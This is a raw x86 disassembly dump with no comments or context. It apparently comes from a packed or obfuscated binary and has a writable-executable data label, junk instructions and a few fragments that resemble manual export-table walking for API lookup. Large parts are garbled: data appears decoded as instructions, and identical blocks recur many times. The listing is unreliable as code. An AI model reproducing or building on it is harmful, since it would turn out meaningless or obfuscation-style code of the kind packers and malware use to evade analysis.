jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1014b104
lea esp [ esp + 0x8 ]
jb rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
bt edi 0x12
cmp eax [ ebp - 0x10 ]
pushad
lea esp [ esp + 0x20 ]
jl rwxdata
pop edi
sub esi edx
popad
je rwxdata
pushad
push [ esp ]
call sub_1020c376
dec esp
cwde
xchg [ ecx ] bl
cmpsb [ esi ] [ edi ]
pop ebx
arpl [ esi - 0x7 ] si
xchg edx eax
mov edi [ ebp + 0x203ed48a ]
add eax 0xa482ddd9
fidiv [ eax ]
into
in eax 0xfa
movsb [ edi ] [ esi ]
cli
mov eax [ 0x37ce36de ]
push 0xe7e6833e
mov [ esp ] bl
lea esp [ esp + 0x4 ]
jae rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
call [ ebx + ebp * 8 - 0x21 ]
aas
test [ eax - 0x40516e2c ] eax
in eax dx
fist [ esi + 0x1f007e05 ]
out dx eax
das
jo rwxdata
push esp
jmp rwxdata
rcr bl cl
cmp cl 0x80
mov ebx eax
inc edi
shld ecx edi 0xa
mov edi eax
call sub_1011f2b5
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
iretd
in eax dx
sbb [ esi - 0x4384754a ] ebx
inc ebp
ficom [ ebp - 0x36 ]
fcomi st0
aas
int 0xcf
dec eax
add eax 0xde618e7a
out dx eax
pop esi
and [ edx ] ebp
and eax 0xe79c4896
int 0x77
fadd [ 0xffffffffe06b4e39 ]
inc ebx
sti
jg rwxdata
into
aaa
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1014b145
lea esp [ esp + 0x4 ]
jae rwxdata
jbe rwxdata
jmp rwxdata
jmp rwxdata
push edx
push 0x8179adcb
lea esp [ esp + 0x8 ]
call sub_10147230
call sub_10147215
pushfd
call sub_1011dfe5
call sub_1020c441
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1014b61b
lea esp [ esp + 0x2c ]
jae rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
btr edi 0x9
lea edi [ eax - 0x3cbf298 ]
call sub_102048d6
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1014b8bc
pushfd
pushfd
push 0x8a0f2064
lea esp [ esp + 0x10 ]
je rwxdata
rol bx cl
mov bl 0xb6
test dh dh
btc bx dx
mov bx [ esi ]
clc
stc
jmp rwxdata
test ax 0x28fa
call sub_101468c8
and [ ebp + 0x2a ] dh
pushfd
jmp rwxdata
and ebx 0xfff
bt dx sp
jmp rwxdata
pushfd
bt bp sp
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1014bbc5
pop eax
lea eax [ rwxdata ]
jmp rwxdata
jmp rwxdata
push rwxdata
call sub_101fcf05
daa
mov eax edx
not al
add edi 0x1
clc
mov al [ edi ]
clc
cmc
call sub_10207775
add [ eax ] al
inc edi
je rwxdata
pop ecx
jb rwxdata
insd
cmp [ esp + ebx * 2 - 0x22336d7d ] ebx
push esp
jb rwxdata
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + edx * 2 + 0x65 ] si
arpl [ ebp + 0x72 ] si
imul esi [ ecx + edi * 2 ] 0x427de14b
pop ebp
inc ecx
xchg ebp eax
jmp 0x28f7a14c
fsubr st1
sbb ah ah
sbb eax 0x33031ca1
sub al 0x75
sub ecx ecx
jne rwxdata
lds ecx [ esi - 0x1e66394f ]
popfd
sub eax 0xbcf1adf1
dec ecx
push ds
mov eax 0x24641807
loope rwxdata
in al 0x2d
int1
loop rwxdata
dec ecx
mov dh al
scasb [ edi ]
lodsb [ esi ]
xor ecx [ eax + 0x3b ]
test [ edx ] ah
mov esp 0x58477bc4
cdq
clc
cmpsd [ esi ] [ edi ]
sti
insd
int1
retn 0x41f6
add eax 0x927d7b3a
cmp eax 0xdfb3f3e2
int3
push ss
cmp eax 0xa611302
push edx
aas
sub_1014be2b
stc
dec al
or al dl
sub ebx edi
sar al 0x1
inc di
add esp 0x4
add ebx esp
xor edi eax
ror di cl
mov edi ebx
clc
setne al
mov al 0x2e
jmp rwxdata
cmp bp 0x165e
call sub_101fce29
and [ ebx + esi ] ebp
push 0x301f3f17
sub eax 0x99927991
mov esp 0xbebca28c
shr [ ebx ] 0xf4
fwait
and al 0xc2
sbb al 0x30
inc eax
call [ eax ]
cmc
pop esi
dec ecx
push ebp
sub [ eax ] al
enter 0xefd7 0xf
sub_1014be53
pushfd
pushfd
mov [ esp + 0x8 ] 0xeb
lea esp [ esp + 0x10 ]
jae rwxdata
movsx dx al
je rwxdata
pushad
test dh dh
add ecx 0x1
mov [ esp + 0x8 ] cl
pushad
mov [ ebp - 0x8 ] ecx
pushfd
push [ esp ]
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
call sub_101159e1
pushad
lea esp [ esp + 0x44 ]
je rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
bt bx 0xe
push ebx
sub al 0x30
call sub_1015a2e8
mov ecx 0xa49ad727
salc
test al 0xb9
cld
pop eax
das
sbb [ ebx ] ebp
adc al 0x8a
adc al 0x28
sbb [ gs : ebp + 0x69 ] ebp
fimul [ esi ]
mov cl 0x19
cmc
adc [ edx + ebx - 0x5b ] ah
std
stc
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1014bea3
lea eax [ rwxdata ]
pushfd
push 0x51d1c2bf
lea esp [ esp + 0x34 ]
jmp rwxdata
call sub_1014c566
mov edx 0xf8e6bc23
loop rwxdata
shl edi cl
dec di
mov edi [ ebx + ecx * 4 ]
bswap esi
btc si sp
clc
add edi eax
pushad
call sub_1011dfcc
call sub_1011e8f7
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
and ecx [ edx ]
mov edi 0x97a883c5
das
iretd
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1014c174
adc ecx ecx
mov [ esp + 0x4 ] 0x30
pushfd
pushad
mov [ esp ] 0x84fb
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
sub_1014c83c
call sub_10147f31
add [ eax ] al
inc edi
je rwxdata
pop es
outsd
jne rwxdata
pop ecx
push 0xffffffe3
dec eax
salc
nop
jae rwxdata
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
add [ ebp + ecx * 4 + 0xf082464 ] bl
test [ esi ] dh
mov [ 0xfffffffffe38000b ] al
cmc
pushfd
pushfd
or ecx ecx
jmp rwxdata
stc
push edi
daa
sub ebx ebx
setbe al
lea eax [ ebp - 0x8 ]
pushfd
pushad
jmp rwxdata
fwait
lahf
pushad
mov esi 0x2a9b8fb4
cmc
pop ebx
imul esp [ edi + 0x8160146 ] 0xffffffb6
xor al 0x57
push 0xce55f625
jg rwxdata
mov [ esp ] 0xea
lea esp [ esp + 0x8 ]
je rwxdata
mov [ eax ] ebx
jmp rwxdata
inc [ ecx + ebp * 2 - 0x33 ]
pop edx
mov dh dh
aaa
stosb [ edi ]
mov ebx 0xa3589331
pop ebx
insb
outsb
xchg esp eax
and al 0x9a
stosd [ edi ]
getsec
adc al 0x5d
add dh dl
iretd
inc esp
imul ecx ebp 0x37f6885a
lea esi [ ebx * 8 + 0x4a13f57e ]
mov bh 0x44
pop esi
movsx di cl
bswap di
mov ebx eax
lea edi [ eax + 0x36287ca4 ]
pop edi
call j_sub_1020b448
or cl 0xee
pushfd
xor ebx ebx
btr ax bp
aad 0xa8
or ch bl
rcl cl 0x1
mov [ ebp - 0x4 ] ebx
sub cx 0x187e
mov eax edx
bt esi eax
btc cx 0x9
shr eax 0x10
shl cl 0x5
sete cl
jmp rwxdata
xchg [ esp + 0x20 ] eax
pop eax
bswap eax
lahf
mov [ esp + 0x18 ] ebx
pushad
lea eax [ eax + 0xdf17860 ]
cwde
lea eax [ ebp - 0x4 ]
mov [ esp + 0x4 ] dx
call sub_10206b56
mov ecx [ esi + 0x4 ]
pushad
cmp sp cx
or ecx ecx
jmp rwxdata
push 0x594fb2c
push [ esp ]
call sub_101ffa2f
jmp rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_10156d61
cmp bx 0xc160
bt esp ebx
cmp [ edi - 0x1 ] 0x0
call sub_1014993d
[ edi ]
pushad
pushad
call sub_10149912
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_101153b8
add di cx
xor di si
mov edi [ edx + 0x24 ]
pushfd
mov [ esp ] dh
push esp
add edi eax
bt esi esp
call sub_101466a1
sub_10156d9f
push 0xa2731489
lea esp [ esp + 0x50 ]
je rwxdata
pushad
stc
stc
xor eax eax
add esp 0x20
pushad
pushad
or ebx ebx
push 0xf46ea48a
push [ esp + 0x8 ]
lea esp [ esp + 0x48 ]
je rwxdata
pushfd
cmc
add edx 0x11c
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
mov bh 0xa6
mov edi [ esp + 0x20 ]
jmp sub_10144c23
movzx si al
mov esi eax
movsx ax al
bswap ax
pushad
mov [ esp + 0x1c ] ebx
push [ esp + 0x4 ]
not ax
pushfd
lea eax [ LocalFree@IAT ]
jmp rwxdata
pushfd
jmp rwxdata
pushad
call sub_102091f3
les esi [ eax - 0x54c3412 ]
or ebx [ esp + esi * 4 ]
inc eax
xchg ebx eax
int3
xchg si di
movzx esi [ edx + 0x1a ]
jmp rwxdata
pop edi
pushfd
pop edi
lea esi [ esi + edx + 0x1c ]
bswap di
push 0x67ac3434
mov edi [ ebp + 0x8 ]
push [ esp ]
lea esp [ esp + 0x8 ]
call sub_1011ec0a
call sub_10201ef0
sub_101571c3
neg cx
mov ecx [ edx + 0x18 ]
mov [ esp ] al
push [ esp ]
pushad
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
lea esp [ esp + 0x28 ]
jbe rwxdata
movsx dx al
je rwxdata
movsx di dl
shr di cl
sub ecx 0x1
shld si di cl
stc
rol edi 0x3
btr si 0xe
mov [ ebp - 0x4 ] ecx
add di cx
xor ch ah
btr cx 0x4
mov ecx [ ebp - 0x8 ]
cmc
add ecx [ ebp - 0x4 ]
bt dx 0x9
sub si cx
shr ecx 0x1
sbb edi ebp
shl si 0x1
bt cx 0xc
mov edi [ ebx + ecx * 4 ]
movsx si dl
sub si sp
btr si 0x6
add edi eax
not si
mov esi [ ebp + 0xc ]
pushfd
jmp j_sub_10208e7c
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1015974d
mov [ esp + 0x8 ] al
imul edx edx 0xa
mov [ esp + 0x4 ] ch
test ah 0x72
add edx eax
mov [ esp + 0x8 ] bh
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_1015a2e8
push [ esp ]
test bx 0xab9d
jmp rwxdata
cmp al 0x9
jmp rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_1015a640
pushad
jmp rwxdata
pushfd
lea esp [ esp + 0x34 ]
ja rwxdata
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
call sub_1011617c
sub_101fcba6
mov [ esp ] sp
lea esp [ esp + 0xc ]
jae rwxdata
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
jmp rwxdata
call sub_10207124
sub_101fce29
pushfd
[ edi ]
jmp rwxdata
lea esp [ esp + 0x8 ]
jne rwxdata
push edi
pushad
call sub_10201207
jmp rwxdata
movzx ax bl
bswap ax
bswap ax
mov [ edi - 0x1 ] 0x0
not ax
mov ah 0x77
push ebx
lahf
lahf
lahf
jmp sub_10207878
sub_101fcf0b
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
call sub_101153b8
shl di cl
mov edi [ edx + 0x24 ]
jmp rwxdata
cmc
add edi eax
bt bx 0xa
clc
movzx ecx [ edi + ecx * 2 ]
shl di cl
mov edi [ edx + 0x1c ]
pushfd
add edi eax
cmc
clc
call sub_10144671
sub_101ff649
xchg bl al
lodsb [ esi ]
and bl ch
inc bl
add bl ah
ror bl 0x5
not al
sbb bl 0x5
or bl 0x58
adc bl bl
sar bl 0x7
sub al 0x59
setb bl
neg al
xor bl 0x57
sub al 0x9d
call sub_1020ac39
int3
sub_101ffa2f
lea esp [ esp + 0x30 ]
je rwxdata
lea esi [ ebx * 8 + 0x4a13f57e ]
mov bh 0x44
pop esi
movsx di cl
bswap di
mov ebx eax
lea edi [ eax + 0x36287ca4 ]
pop edi
call j_sub_1020b448
bts di ax
cmp dh 0x1b
test di 0xf213
add [ ebp - 0x4 ] ecx
or bh al
sub ecx 0x8
push 0x39ab5d14
and bl 0xa1
shr ecx 0x1
shl di cl
jmp rwxdata
mov edi [ esi ]
sub bx di
clc
or bl cl
push 0xe81bd4a2
add edi [ ebp + 0x10 ]
sbb bx 0x5aa7
call sub_1011606c
sub_101ffc63
call sub_10206e09
xor edx ebp
imul esp eax 0x1f0e111e
pushfd
loop rwxdata
cmp ecx ecx
jg rwxdata
pop ds
jno rwxdata
inc ebx
cmp ecx [ edi + 0x49 ]
cdq
retn
je rwxdata
adc [ esi ] ecx
pop ds
cmpsd [ esi ] [ edi ]
inc edi
imul esp
sar [ ebx ] cl
jecxz rwxdata
aaa
xor ah ch
mov edx 0xd7e7ad8a
call 0xffffffffed05be65
cmpsd [ esi ] [ edi ]
cmp ecx edx
mov ah 0xa
sbb ebp [ eax ]
shr [ ecx - 0x66 ] cl
mov edx 0xa46c5bc4
out 0xde al
mov cl 0x7a
lds edx [ ebp + 0x53 ]
inc ebp
push edx
xor esi [ edx ]
insb
insb
add al ch
mov eax [ 0x33000071 ]
aad 0x69
loopne rwxdata
pop edx
and ebx [ ebx - 0xe ]
mov [ ebp + 0x466de2bd ] ds
push ecx
popfd
mov [ 0x674ff3fc ] al
mov ebp 0x6a554a75
cmpsd [ esi ] [ edi ]
ja rwxdata
pop es
fwait
inc ebx
mov esp 0x67abd483
test [ edi - 0x70 ] 0x5ca26877
popfd
int1
push 0x6b
push ebx
mov [ 0x2d68d65c ] al
xchg ecx eax
rol dl cl
mov ah 0xb2
or al 0xcb
mov [ eax - 0x3b ] eax
push es
dec edx
aam 0xe5
dec ecx
mov [ edx + 0x4db436c3 ] dl
mov edi 0xc88c1616
loop rwxdata
cmp [ 0xffffffff96b0c185 ] esp
jle rwxdata
and ebx ebx
mov bh 0xe8
fiadd [ ecx ]
in eax dx
xor bl [ eax ]
inc edi
loop rwxdata
nop
salc
push 0xc2d2912d
imul ecx [ eax - 0x43 ] 0xa7d8c678
add [ fs : edx - 0x4b03163d ] 0x1f
in al dx
les ebx [ ebx + 0x6c ]
movsb [ edi ] [ esi ]
push es
